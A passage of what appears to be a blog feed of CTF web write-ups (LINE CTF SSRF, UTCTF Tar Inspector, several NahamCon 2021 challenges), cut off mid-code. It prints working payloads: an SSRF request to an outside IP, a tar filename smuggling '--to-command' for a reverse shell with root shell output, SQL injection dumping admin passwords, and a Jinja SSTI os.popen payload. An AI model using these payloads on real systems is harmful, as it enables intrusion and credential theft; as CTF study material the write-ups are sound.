class="title">integrityStatus</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/integrityStatus&#x27;</span>&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/integreityStatus : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;download?src=http://141.164.52.207/a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;src=http://141.164.52.207/a123&#x27;</span>)&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/download : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/rollback?dbhash=a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;dbhash=a123&#x27;</span>), <span class="string">&#x27;Key&#x27;</span>:Key&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/rollback : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    integrityStatus()</span><br><span class="line">    download()</span><br><span class="line">    rollback()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTCTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-UTCTF-2021/"/>
      <url>2021/03/14/2021-03-14-UTCTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Tar-Inspector-994-pts"><a href="#Web-Tar-Inspector-994-pts" class="headerlink" title=" (Web) Tar Inspector [994 pts]"></a><span style="color:#21C587"></span> (Web) Tar Inspector [994 pts]</h2><blockquote><p>Tar Inspector challenge is get the shell using RCE and read the flag</p></blockquote><p>Many people asked for a hint and the contest provided the code for the secure_filename() function. And first, I’ll see <code>secure_filename()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># creates a secured version of the filename</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="comment"># strip extension and any sneaky path traversal stuff</span></span><br><span class="line">    filename = filename[:-<span class="number">4</span>]</span><br><span class="line">    filename = os.path.basename(filename)</span><br><span class="line">    <span class="comment"># escape shell metacharacters</span></span><br><span class="line">    filename = re.sub(<span class="string">&quot;(!|\$|#|&amp;|\&quot;|\&#x27;|\(|\)|\||&lt;|&gt;|`|\\\|;)&quot;</span>, <span class="string">r&quot;\\\1&quot;</span>, filename)</span><br><span class="line">    filename = re.sub(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, filename)</span><br><span class="line">    <span class="comment"># add extension</span></span><br><span class="line">    filename += <span class="string">&#x27;__&#x27;</span>+<span class="built_in">hex</span>(randrange(<span class="number">10000000</span>))[<span class="number">2</span>:]+<span class="string">&#x27;.tar&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><p>You can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true"></p><p>Go into the challenge and you can will see the file upload function.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true"></p><p>If you upload any file, you can see that only the <code>.tar</code> extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file <code>using --to-command</code> option :)</p><ul><li>Scenario</li></ul><ol><li>I compress the reverse shell code to tar file and I upload in server.</li><li>If you upload the tar file, you can see the newly created file name.</li><li>If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the <code>--to-command</code> option at this time.</li><li>And since the last in the file must be <code>.tar</code>, you can bypass it using the <code>--exclude</code> option.</li></ol><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true"></p><p>After uploading the tar file, you can see a file named <code>pocas__bf9d0.tar</code> was created :) Now, When you unpack the <code>pocas__bf9d0.tar</code> file, you can execute the reverse shell file.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: web2.utctf.live:8123</span><br><span class="line">Content-Length: 1566</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;pocas__bf9d0.tar --to-command&#x3D;python3$&#123;IFS&#125;pocas.py --exclude&#x3D;pocas.tar&quot;</span><br><span class="line">Content-Type: application&#x2F;x-tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>I used the <code>--to-command</code>/<code>--exclude</code> option as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 80</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;tmp&#x2F;extracts</span><br><span class="line"># cat &#x2F;flag.txt</span><br><span class="line">utflag&#123;bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk&#125;</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>You can see that it is unpacked, and the file is executed to get the shell :)</p><blockquote><p>FLAG : utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NahamCon CTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-NahamCon-CTF-2021/"/>
      <url>2021/03/14/2021-03-14-NahamCon-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Asserted-283-pts"><a href="#Web-Asserted-283-pts" class="headerlink" title=" (Web) Asserted [283 pts]"></a><span style="color:#21C587"></span> (Web) Asserted [283 pts]</h2><blockquote><p>Asserted challenge is get flag using LFI and assert() vuln</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/1.png?raw=true"></p><p>Go into the challenge and u will see a simple blog and <code>ABOUTS US</code>/<code>SCHEDULE</code>/<code>GALLERY</code>/<code>BLOG</code>/<code>CONTACTS</code> function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/2.png?raw=true"></p><p>So once I went into <code>ABOUT DS</code> and looked at <code>URL</code>, I could see that the file was fetched using the <code>page</code> parameter. Here I thought that I could do LFI attack using <code>PHP Wrapper</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/3.png?raw=true"></p><p>When I read the index.php file using <code>PHP Wrapper</code>, I could see that it worked.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Saving ourselves from any kind of hackings and all</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;home.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at the index.php code, you can see that it is using the assert() function. So you can use the assert() function vulnerability to read the flag with <code>RCE</code>.</p><blockquote><p>FLAG : flag{85a25711fa6e111ed54b86468a45b90c}</p></blockquote><hr><h2 id="Web-Bad-Blog-469-pts"><a href="#Web-Bad-Blog-469-pts" class="headerlink" title=" (Web) Bad Blog [469 pts]"></a><span style="color:#21C587"></span> (Web) Bad Blog [469 pts]</h2><blockquote><p>Bad Blog challenge is get the admin account using the SQL Injection of insert statements.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/1.png?raw=true"></p><p>Go into the challenge and u will see a login form.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/2.png?raw=true"></p><p>When u register and login, u will see the posts and <code>add post</code>/<code>Logged in</code> as a function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/3.png?raw=true"></p><p>I created a post and was able to read it with <code>/post/:title</code>. I thought there would be an xss or ssti vuln here. but it didn’t happen at all.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/5.png?raw=true"></p><p>I found something interesting in <code>/profile</code>. Whenever someone read my post, I creat a log using <code>User-Agent</code>. I thought I was save log using a database, So, I try SQL Injection using <code>User-Agent</code> in <code>/post:title</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/6.png?raw=true"></p><p>When i passed the value of <code>User-Agent</code>, I could see a db error :) I was able know using sqlite3 in server and using insert statements. So, I’ll try union SQL Injection attack of insert statements in sqlite 3!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent : a&#39;), (5, 2, (select group_concat(sql) from sqlite_master))--</span><br><span class="line">Output     : CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(40), password VARCHAR(40), PRIMARY KEY (id), UNIQUE (username) ),CREATE TABLE post ( id INTEGER NOT NULL, title VARCHAR(40), author_id INTEGER, date VARCHAR(40), category VARCHAR(40), image VARCHAR(60), thumbnail VARCHAR(60), heading VARCHAR(200), content VARCHAR(10000), PRIMARY KEY (id), UNIQUE (title), FOREIGN KEY(author_id) REFERENCES user (id) ),CREATE TABLE visit ( id INTEGER NOT NULL, post_id INTEGER, user_id INTEGER, ua VARCHAR(100), PRIMARY KEY (id), FOREIGN KEY(post_id) REFERENCES post (id), FOREIGN KEY(user_id) REFERENCES user (id) )</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(username) from user))--</span><br><span class="line">Output     : a,admin</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(password) from user))--</span><br><span class="line">Output     : J3H8cqMNWxH68mTj,a</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, login as an administrator to get the flag.</p><blockquote><p>FLAG : flag{8b31eecb1831ed594fa27ef5b431fe34}</p></blockquote><hr><h2 id="Web-AgentTester-463-pts"><a href="#Web-AgentTester-463-pts" class="headerlink" title=" (Web) AgentTester [463 pts]"></a><span style="color:#21C587"></span> (Web) AgentTester [463 pts]</h2><blockquote><p>AgentTester challenge is get the admin account using SQL Injection and after login get the flag using SSTI.</p></blockquote><p>Frist, I’ll analysis source code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_uwsgi_websocket <span class="keyword">import</span> GeventWebSocket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> backend.backend <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ws = GeventWebSocket(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    success = request.args.get(<span class="string">&quot;success&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    error = request.args.get(<span class="string">&quot;error&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/index.html&quot;</span>,</span><br><span class="line">        user=g.user,</span><br><span class="line">        success=success,</span><br><span class="line">        error=error,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/debug&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> sessionID == <span class="number">1</span>:</span><br><span class="line">        code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&lt;h1&gt;Safe Debug&lt;/h1&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(code)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile/&lt;int:user_id&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">user_id</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> g.user.<span class="built_in">id</span> == user_id:</span><br><span class="line">        user_now = User.query.get(user_id)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            about = request.form.get(<span class="string">&quot;about&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">            email = request.form.get(<span class="string">&quot;email&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> email:</span><br><span class="line">                user_now.email = email</span><br><span class="line">            <span class="keyword">if</span> about:</span><br><span class="line">                user_now.about = about</span><br><span class="line">            <span class="keyword">if</span> email <span class="keyword">or</span> about:</span><br><span class="line">                db.session.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            url_for(<span class="string">&quot;home&quot;</span>, error=<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/profile.html&quot;</span>,</span><br><span class="line">        user=user_now,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@ws.route(<span class="params"><span class="string">&quot;/req&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">with</span> app.request_context(ws.environ):</span><br><span class="line">        sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sessionID:</span><br><span class="line">            ws.send(<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        uAgent = ws.receive().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent:</span><br><span class="line">            ws.send(<span class="string">&quot;There was an error in your message.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            query = db.session.execute(</span><br><span class="line">                <span class="string">&quot;SELECT userAgent, url FROM uAgents WHERE userAgent = &#x27;%s&#x27;&quot;</span> % uAgent</span><br><span class="line">            ).fetchone()</span><br><span class="line"></span><br><span class="line">            uAgent = query[<span class="string">&quot;userAgent&quot;</span>]</span><br><span class="line">            url = query[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ws.send(<span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent <span class="keyword">or</span> <span class="keyword">not</span> url:</span><br><span class="line">            ws.send(<span class="string">&quot;Query error.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        subprocess.Popen([<span class="string">&quot;node&quot;</span>, <span class="string">&quot;browser/browser.js&quot;</span>, url, uAgent])</span><br><span class="line"></span><br><span class="line">        ws.send(<span class="string">&quot;Testing User-Agent: &quot;</span> + uAgent + <span class="string">&quot; in url: &quot;</span> + url)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Frist, You can see <code>/debug</code>. When <code>sessionID</code> is 1, you can see that the <code>code</code> parameter value is received and passed to the template. Here, because there is no verification of <code>code</code> parameter, a SSTI vulnerability occurs. But, because the <code>sessionID</code> must be 1. So, we need find out the admin account :(</p><p>Second, You can see <code>/req</code>. You can see that the value of <code>User-Agent</code> is received and put in the <code>SQL query statement</code>. Here, because there is no verification of User-Agent, a SQL Injection vulnerability occurs. :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line">service nginx start</span><br><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line">export PORT&#x3D;&#39;80&#39;</span><br><span class="line">export ADMIN_BOT_USER&#x3D;&quot;admin&quot;</span><br><span class="line">export ADMIN_BOT_PASSWORD&#x3D;&quot;&lt;REDACTED&gt;&quot;</span><br><span class="line"></span><br><span class="line">export CHALLENGE_NAME&#x3D;&quot;AgentTester&quot; &amp;&amp; export CHALLENGE_FLAG&#x3D;&quot;&lt;REDACTED&gt;&quot;\</span><br><span class="line">    &amp;&amp; uwsgi --ini app.ini</span><br></pre></td></tr></table></figure><p>Third, The flag exists in the environment variable CHALLENGE_FLAG.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/1.png?raw=true"></p><p>Go into the challenge and u will see a login form. So, after register, login.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/2.png?raw=true"></p><p>I was login and saw <code>User-Agent</code> input form.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/3.png?raw=true"></p><p>You can see that an error occurs because single quotes are sent as the value of <code>User-Agent</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select &#39;a&#39;, group_concat(sql) from sqlite_master --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(username) from user --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(password) from user --</span><br><span class="line"></span><br><span class="line">admin account</span><br><span class="line">username : admin</span><br><span class="line">password : *)(@skdnaj238374834**__**&#x3D;</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, you can login as an administrator and read the environment variable using the SSTI vuln.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Let’s use the payload above.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/6.png?raw=true"><br>If you run the <code>ls</code> command using the payload above, you can see that it works.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/5.png?raw=true"><br>Finally, when you read all the environment variables using the <code>export</code> command, you can see that there are flag in the environment variables.</p><blockquote><p>FLAG : flag{fb4a87cfa85cf8c5ab2effedb4ea7006}</p></blockquote><hr><h2 id="Web-Cereal-and-Milk-491-pts"><a href="#Web-Cereal-and-Milk-491-pts" class="headerlink" title=" (Web) Cereal and Milk [491 pts]"></a><span style="color:#21C587"></span> (Web) Cereal and Milk [491 pts]</h2><blockquote><p>Cereal and Milk challenge is get the flag using simple php object injection</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;log.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logs</span> = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cereal</span> = <span class="string">&#x27;Captain Crunch&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$milk</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processed_data</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Deserilized data:&lt;br&gt; Coming soon.&quot;</span>;</span><br><span class="line">       <span class="comment"># echo print_r($output);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cereal_and_milk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cereal . <span class="string">&quot; is the best cereal btw.&quot;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;serdata&#x27;</span>];</span><br><span class="line"><span class="variable">$output</span> = unserialize(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> CerealAndMilk;</span><br><span class="line"><span class="variable">$app</span> -&gt; cereal_and_milk(<span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Looking at index.php, you can see that the log.php file is loaded and the value of the serdata parameter is retrieved and deserialized.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span 